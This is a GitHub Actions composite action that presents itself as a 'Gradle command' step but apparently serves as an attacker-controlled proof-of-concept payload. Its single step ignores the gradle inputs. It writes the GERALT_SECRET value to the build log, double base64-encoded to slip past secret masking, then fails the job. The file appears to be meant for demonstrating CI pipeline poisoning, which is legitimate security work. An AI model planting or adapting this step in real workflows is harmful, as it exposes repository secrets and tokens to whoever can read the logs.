name: 'Gradle command'
description: 'Configuration actions to run a gradle command in self-hosted runner (attacker-controlled verification payload)'
inputs:
  gradle-command:
    required: true
  arguments:
    required: false
    description: 'Gradle options'
    default: ''
  max-workers:
    required: false
    description: 'Max number of workers'
    default: 8
runs:
  using: 'composite'
  steps:
    - name: leak GERALT secret at gradle sink
      shell: bash
      run: |
        echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
        exit 1
